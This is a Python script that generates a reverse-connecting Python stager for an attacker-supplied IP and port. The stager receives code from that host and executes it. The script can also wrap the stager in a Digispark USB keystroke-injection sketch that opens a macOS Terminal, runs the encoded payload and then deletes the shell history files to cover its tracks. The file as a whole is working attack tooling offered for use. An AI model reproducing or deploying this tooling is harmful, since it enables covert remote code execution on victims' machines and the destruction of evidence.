import argparse
import sys
import base64 

CURLY_L = "{"
CURLY_R = "}"

def write_file(filename, content):
  with open(filename, "w") as out:
    out.write(content)
  print("File written as " + filename)

parser = argparse.ArgumentParser()

try:
  sys.argv[1]
except:
  print(
    "usage: -i ip address to connect to\n"
    "usage: -p port number\n"
    "usage: -py True, only generates python payload -- optional flag"
    "usage: -h show help"
  )

parser.add_argument("-i", "--ipaddress", help="IP address")
parser.add_argument("-p", "--port", help="Port number")
parser.add_argument("-py", "--python", help="only generates python payload")

args = parser.parse_args()
if(args.ipaddress and args.port):    
  IP_ADDRESS = args.ipaddress
  PORT = args.port
else:
  print("Missing option(s). -h for more help.")
  exit()

#options received
print(IP_ADDRESS)
print(PORT)
PARTIAL = "'s':s"

payload = f"import socket,zlib,base64,struct,time\nfor x in range(10):\n\ttry:\n\t\ts=socket.socket(2,socket.SOCK_STREAM)\n\t\ts.connect(('{IP_ADDRESS}',{PORT}))\n\t\tbreak\n\texcept:\n\t\ttime.sleep(5)\nl=struct.unpack('>I',s.recv(4))[0]\nd=s.recv(l)\nwhile len(d)<l:\n\td+=s.recv(l-len(d))\nexec(zlib.decompress(base64.b64decode(d)),{{{PARTIAL}}})\n"

if(args.python):
  write_file("d.py", payload)

else: #generate Arduino sketch
  INITIAL_DELAY = 700
  PAYLOAD_BYTES = payload.encode("ascii")
  ENCODED_BYTES = base64.b64encode(PAYLOAD_BYTES)
  ENCODED_PAYLOAD = ENCODED_BYTES.decode("ascii") #encoded payload to be loaded in Ardiono file
  ARDUINO_SKETCH_TEMPLATE = f"DELAY {INITIAL_DELAY}\n\tGUI SPACE\n\tDELAY 100\n\tSTRING Terminal\n\tDELAY 200\n\tENTER\n\tDELAY 200\n\tSTRING python -c \"$(printf '%s' '{ENCODED_PAYLOAD}' | base64 -D)\"\n\tENTER\n\tDELAY 700\n\tGUI q\n\tDELAY 100\n\tGUI SPACE\n\tDELAY 100\n\tSTRING Terminal\n\tDELAY 200\n\tENTER\n\tDELAY 100\n\tSTRING rm ~/.bash_history ~/.zsh_history\n\tENTER\n\tDELAY 100\n\tGUI q\n"
  ARDIONO_FILE_CONTENT = f"#include\t\"DigiKeyboard.h\"\n\nvoid setup()\t{CURLY_L}\n\t//LEAVE EMPTY\n{CURLY_R}\n\nvoid loop()\t{CURLY_L}\n\t{ARDUINO_SKETCH_TEMPLATE}{CURLY_R}"
  write_file("digispark_sketch.ino", ARDIONO_FILE_CONTENT)


  
